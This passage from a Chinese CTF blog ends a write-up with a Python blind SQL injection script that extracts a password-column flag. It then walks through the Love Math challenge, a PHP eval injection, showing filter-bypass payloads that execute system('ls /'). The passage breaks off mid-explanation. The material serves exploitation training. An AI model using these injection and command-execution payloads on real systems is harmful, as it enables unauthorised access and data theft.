table_name存储指定表的名字</span><br>table_name = <span class="hljs-string">&quot;F1naI1y&quot;</span><br><span class="hljs-comment"># col_name存储指定字段的名字</span><br>col_name = <span class="hljs-string">&quot;password&quot;</span><br><span class="hljs-comment"># col_data_num存储有多少列</span><br><span class="hljs-comment"># 手动指定要查看多少列数据，由于合在一起显示所以只有一列</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnum存储每个字段数据的字符个数</span><br><span class="hljs-comment"># 手动指定要查看多少字符数据</span><br>col_data_charnum = <span class="hljs-number">50</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 先遍历该字段有多少列</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># data用来字段该列的数据</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># 用二分法对当前字段进行猜解</span><br>        <span class="hljs-comment"># 从可打印字符开始</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 对第n个字符进行判断</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>            <span class="hljs-comment"># payload1:用于普通盲注</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            <span class="hljs-comment"># payload2 = &quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(col_name, table_name, rank_data_index+1, tmp)</span><br>            payload3 = <span class="hljs-string">&quot;1^(ascii(substr((select(password)from(&#123;&#125;)where(username=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.get(url + payload3)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>            true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># 返回true界面 </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 返回flase界面</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># 继续下一个字符</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 继续下一列</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;字段第&#123;&#125;列的值:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">password字段第1列的值:flag&#123;0ca992a6-fc81-43d7-8419-deba5dea5107&#125;<br></code></pre></td></tr></table></figure><p>flag &#x3D; flag{0ca992a6-fc81-43d7-8419-deba5dea5107}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[CISCN 2019 初赛]Love Math 题解</title>
    <link href="/2023/08/24/2023-08-24-Love%20Math/"/>
    <url>/2023/08/24/2023-08-24-Love%20Math/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><p>1.打开网页发现是PHP代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>2.代码审计:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-comment">//isset函数用于判断该变量是否为null,如果为null返回flase</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-comment">//将GET方法获取的内容传输给变量content</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-comment">//判断输入的内容长度是否&gt;=80</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//设置黑名单数据:空格,\t,\r,&#x27;,&quot;,`,[,]</span><br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<span class="hljs-comment">//遍历黑名单数据</span><br>        <span class="hljs-comment">//正则表达式/m表示多行匹配</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-comment">//设置可以被允许使用的函数名单</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-comment">//$used_funcs用于存储匹配到的字符串</span><br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>); <br>    <span class="hljs-comment">//$used_funcs[0]:表示数组used_funcs的起始地址，使func从数组第一个开始取，直到最后一个 </span><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<span class="hljs-comment">//遍历匹配到的字符串</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-comment">//匹配到的字符串如果不存在于白名单中</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<span class="hljs-comment">//有危险函数执行，可以通过$content=system(&quot;ls /&quot;)执行恶意代码</span><br>&#125; <br></code></pre></td></tr></table></figure><p>函数介绍:<br><strong>issert:</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">用于判断变量的内容是否为空，如果为null,则返回false<br></code></pre></td></tr></table></figure><p><strong>show_source(filename,return)</strong>:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">show_source() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。<br><br>用于高亮的颜色可通过 php.ini 文件进行设置或者通过调用 ini_set() 函数进行设置。<br><br>show_source() 是 highlight_file() 的别名。<br><br>注释：当使用该函数时，整个文件都将被显示，包括密码和其他敏感信息！<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824101642383.png" alt="image-20230824101642383"></p><p><strong>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags &#x3D; 0 [, int $offset &#x3D; 0 ]]] ):</strong><br><img src="/images/2023-8-24_LoveMath/image-20230824102848164.png" alt="image-20230824102848164"></p><p><strong>in_array(search,array,type)</strong></p><p><img src="/images/2023-8-24_LoveMath/image-20230824104747383.png" alt="image-20230824104747383"></p><p>3.分析:<br><strong>由于我们需要利用最后eval()函数执行恶意代码，所以最后content的值应该为:</strong><br><strong>system(“ls &#x2F;“)</strong></p><p>测试代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;system(&quot;dir&quot;)&#x27;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<span class="hljs-comment">//发生函数执行</span><br></code></pre></td></tr></table></figure><p>输出:<br><img src="/images/2023-8-24_LoveMath/image-20230824105712830.png" alt="image-20230824105712830"></p><p>而content的值又是GET(‘c’)进行获取</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=system(&quot;ls /&quot;)<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824105855231.png" alt="image-20230824105855231"></p><p>这是因为我们输入的内容中含有黑名单字符:”,空格</p><p><strong>在PHP代码中没有””命令依然可以被执行:</strong><br>测试:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;system(dir)&#x27;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<span class="hljs-comment">//发生函数执行</span><br></code></pre></td></tr></table></figure><p>输出:<br><img src="/images/2023-8-24_LoveMath/image-20230824110120472.png" alt="image-20230824110120472"></p><p><strong>由于eval()可以执行正确语法的PHP代码，所以我们可以在eval()中构造一个PHP代码,即用变量保存函数和参数:</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">eval(echo $_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]));<br></code></pre></td></tr></table></figure><p>所以最后构造的payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;])&amp;a=system&amp;b=ls /<br></code></pre></td></tr></table></figure><p><strong>GET()函数中也可以不需要单引号’’,并且[]可以使用{}代替</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;a&#125;($_GET&#123;b&#125;)&amp;a=system&amp;b=ls /<br></code></pre></td></tr></table></figure><p>测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>&#123;a&#125;(<span class="hljs-variable">$_GET</span>&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?a=system&amp;b=dir <br></code></pre></td></tr></table></figure><p>输出:</p><p><img src="/images/2023-8-24_LoveMath/image-20230824130556447.png" alt="image-20230824130556447"></p><p>在题目的网页中输入后显示:<br>![image-20230824130738728](images&#x2F;2023-8-24_Love Math&#x2F;image-20230824130738728.png)</p><p>这时已经绕过第一层判断，来到第二层判断:</p><p>4.对第二层判断进行绕过:</p><p><strong>函数介绍:</strong><br><strong>base_convert()函数(属于数学函数):</strong><br><img src="/images/2023-8-24_LoveMath/image-20230824131254523.png" alt="image-20230824131254523"></p><h5 id="hex2bin-String-函数（属于字符串函数）"><a href="#hex2bin-String-函数（属于字符串函数）" class="headerlink" title="hex2bin(String) 函数（属于字符串函数）:"></a><strong>hex2bin(String) 函数（属于字符串函数）:</strong></h5><p><img src="/images/2023-8-24_LoveMath/image-20230824131526831.png" alt="image-20230824131526831"></p><h5 id="dechex-函数（属于数学函数）"><a href="#dechex-函数（属于数学函数）" class="headerlink" title="dechex() 函数（属于数学函数）:"></a><strong>dechex() 函数（属于数学函数）:</strong></h5><p><img src="/images/2023-8-24_LoveMath/image-20230824131746347.png" alt="image-20230824131746347"></p><p>现在的payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;a&#125;($_GET&#123;b&#125;)&amp;a=system&amp;b=ls /<br></code></pre></td></tr></table></figure><p>由于函数:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);<br></code></pre></td></tr></table></figure><p>对该正则表达式的解释:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*:<br>表示第一个字符是以a-z或A-Z或_或不可见字符中的一个，第二个字符是a-z或A-Z或_或数字或不可见字符中的一个<br>且第二个字符的情况可以出现0次或多次(符合PHP对变量名的要求):<br>实例:<br>a9oo9<br>Aa99o<br>_GET<br>不可见字符9oooa<br><br>所以数字开头的字符串不会被匹配<br></code></pre></td></tr></table></figure><p>所以提取的是content字符串中所有的单词，所以最终content会被提取成:GET,a,b</p><p><strong>这些单词都不包含在白名单中，所以要将这些单词进行替换(内部函数名可以被用作是参数名)a&#x3D;&gt;abs,b&#x3D;&gt;atan,GET由于是要函数执行，所以无法被替换:</strong><br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;abs&#125;($_GET&#123;atan&#125;)&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p>我们可以利用数学函数对$_GET进行转码</p><p><strong>36进制介绍(同理17-35进制，就是少了一些字母):</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">三十六进制，是数据的一种表示方法。同我们日常生活中的表示法不一样。它由0-9，A-Z组成，字母不区分大小写。与10进制的对应关系是：0-9对应0-9；A-Z对应10-35<br></code></pre></td></tr></table></figure><p>实例:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs txt">//35=&gt;z<br>print(base_convert(35,10,36).&quot;\n&quot;);<br><br>//37=36+1=&gt;36^1*1+36^0*1=&gt;11<br>print(base_convert(37,10,36).&quot;\n&quot;);<br><br>//9=&gt;9<br>print(base_convert(9,10,36).&quot;\n&quot;);<br><br>//70=&gt;36+34=&gt;36^1*1+36^0*34=&gt;1y<br>print(base_convert(70,10,36).&quot;\n&quot;);<br><br>输出:<br>z<br>11<br>9<br>1y<br></code></pre></td></tr></table></figure><p>我们可以发现通过十进制转36进制可以被0-9和a-z的字符进行表示输出36进制字符串，所以我们可以构造一个特定的十进制值使其被转化为36进制时刚好是字符串函数hex2bin:</p><p>将36进制(36进制包含所有非特殊字符，可以用于表示所有不含特殊字符的函数)hex2bin转化为10进制:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;hex2bin&quot;</span>,<span class="hljs-number">36</span>,<span class="hljs-number">10</span>).<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-comment">//37907361743</span><br></code></pre></td></tr></table></figure><p>由于$_GET函数含有特殊字符，所以必须使用hex2bin将16进制转化为ASCII码的形式进行代换</p><p><strong>将字符串转化为16进制:</strong></p><figure class="highlight py"><table><tr><td 